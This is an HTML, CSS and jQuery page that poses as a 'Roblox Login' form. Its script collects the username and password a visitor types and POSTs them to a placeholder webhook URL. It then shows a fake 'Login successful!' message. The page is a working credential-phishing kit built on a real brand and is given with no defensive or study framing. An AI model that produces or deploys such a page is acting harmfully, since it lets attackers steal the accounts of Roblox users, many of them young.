```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
    <!-- Login Section -->
    <section id="login" class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Roblox Login</h2>
                <form id="loginForm">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" class="form-control" id="username" placeholder="Enter your username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" class="form-control" id="password" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Login</button>
                </form>
            </div>
        </div>
    </section>

    <!-- Bootstrap & jQuery JS -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#loginForm').submit(function(e) {
                e.preventDefault();
                var username = $('#username').val();
                var password = $('#password').val();
                var data = {
                    username: username,
                    password: password
                };
                $.ajax({
                    url: 'https://your-webhook-url',
                    type: 'POST',
                    data: JSON.stringify(data),
                    contentType: 'application/json',
                    success: function(response) {
                        alert('Login successful!');
                    },
                    error: function(error) {
                        alert('Login failed. Please try again.');
                    }
                });
            });
        });
    </script>
</body>
</html>
```

```css
body {
    font-family: Arial, sans-serif;
}

#login {
    background-color: #f7f7f7;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
}
```

```js
// JavaScript code is included in the HTML file above.
```
